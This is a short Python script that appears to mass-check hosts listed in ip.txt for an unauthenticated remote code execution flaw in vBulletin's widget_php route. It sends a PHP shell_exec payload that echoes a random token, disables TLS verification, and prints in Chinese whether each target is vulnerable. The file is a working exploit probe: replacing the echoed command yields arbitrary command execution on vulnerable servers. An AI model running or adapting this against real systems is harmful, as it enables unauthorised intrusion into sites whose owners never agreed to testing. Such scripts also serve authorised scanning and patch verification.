from requests.packages import urllib3

urllib3.disable_warnings()
import requests
import random
import string
whoami = ''.join(random.sample(string.ascii_letters + string.digits, 8))
#print(whoami)

def check(url, timeout):
    result=""
    payload = '/index.php?routestring=ajax/render/widget_php'
    url = str(url) + payload
    data = "widgetConfig%5Bcode%5D+=+echo+shell_exec%28%27echo+{}%27%29%3B+exit%3B".format(whoami)
    #print(url)
    headers ={
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    try:
        req = requests.post(url,data=data,headers=headers,verify=False,timeout=timeout).text
        #print(req)
        if whoami in req:
            result =url + u"存在未授权RCE"
            print(result)
        else:
            print('不存在该漏洞')

    except Exception as e:
        print('不存在该漏洞')


if __name__ == '__main__':
    f = open("ip.txt")
    line = f.readline()
    #print(line)
    for line in open("ip.txt"):
        url = line.strip()
        check(url, 10)

    f.close()